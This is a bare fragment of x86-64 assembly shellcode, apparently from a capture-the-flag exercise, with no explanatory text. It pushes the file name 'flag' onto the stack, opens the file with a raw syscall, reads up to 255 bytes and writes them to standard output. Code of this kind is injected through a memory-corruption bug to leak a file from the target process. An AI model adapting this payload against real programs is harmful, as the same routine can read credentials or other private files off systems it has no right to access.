push 1
dec byte ptr [rsp]
//mov rax, 0x7478742e67616c66 flag.txt
mov rax, 0x67616c66
push rax
/* call open('rsp', 'O_RDONLY', 0) */
push SYS_open /* 2 */
pop rax
mov rdi, rsp
xor esi, esi /* O_RDONLY */
cdq /* rdx=0 */
syscall
mov rdi,rax
xor rax,rax
mov rsi,rsp
add rsi,0x100
mov dl,0xff
syscall
xor rax,rax
inc rax
xor rdi,rdi
inc rdi
mov rsi,rsp
add rsi,0x100
mov dl,0xff
syscall
